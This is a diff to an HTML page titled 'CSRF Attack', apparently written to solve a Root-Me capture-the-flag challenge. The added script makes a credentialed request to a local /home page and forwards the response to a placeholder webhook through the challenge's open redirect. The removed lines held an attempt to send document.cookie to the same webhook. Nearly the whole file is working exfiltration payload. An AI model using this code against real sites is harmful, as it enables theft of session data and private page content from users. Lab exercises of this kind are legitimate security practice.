@@ -2,20 +2,22 @@
 <html>
 <head>
     <title>CSRF Attack</title>
-    <style>
-        /* Create CSS selectors that will trigger for specific cookie content */
-        @import url("http://your-webhook-url?cookie=" + document.cookie);
-    </style>
 </head>
 <body>
     <script>
-        // Fallback - try direct redirection after a short delay
+        // Try XHR with specific settings
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'http://127.0.0.1:58039/home', true);
+        xhr.withCredentials = true;
+        xhr.onload = function() {
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?home=' + encodeURIComponent(xhr.responseText);
+        };
+        xhr.send();
+        
+        // Fallback
         setTimeout(function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?redirect=true';
-        }, 1000);
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?timeout=true';
+        }, 1500);
     </script>
-    
-    <!-- Try to load a hidden iframe to /home which might reveal the flag -->
-    <iframe src="http://127.0.0.1:58039/home" style="display:none"></iframe>
 </body>
 </html>
